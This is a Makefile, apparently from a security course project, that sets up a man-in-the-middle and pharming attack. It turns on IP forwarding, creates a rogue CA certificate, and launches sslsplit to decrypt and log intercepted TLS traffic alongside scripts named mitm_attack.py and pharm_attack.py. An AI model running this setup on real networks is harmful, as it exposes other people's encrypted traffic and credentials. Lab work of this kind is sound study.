PY = mitm_attack.py
PY2 = pharm_attack.py
EXE = mitm_attack
EXE2 = pharm_attack 
LOGDIR = logdir
SSLSPLIT = sslsplit
all: run 

#install:
#	pip install wheel
#	pip install --pre scapy[basic]
#	pip install netifaces
#	pip install netfilterqueue
# sudo sslsplit -d -l connections.log -j sslsplit -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 &
run:
	[ -d $(LOGDIR) ] || mkdir -p $(LOGDIR)
	[ -d $(SSLSPLIT) ] || mkdir -p $(SSLSPLIT)
	
	sudo bash -c 'echo "1" > /proc/sys/net/ipv4/ip_forward' 
	
	sudo sysctl -w net.ipv4.ip_forward=1
	
	openssl genrsa -out ca.key 4096
	openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
	sudo sslsplit -d -l connections.log -j $(SSLSPLIT) -S $(LOGDIR) -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 &
	cp $(PY) $(EXE)
	cp $(PY2) $(EXE2)

clean:
	rm -f ca.key
	rm -f ca.crt
	sudo iptables --flush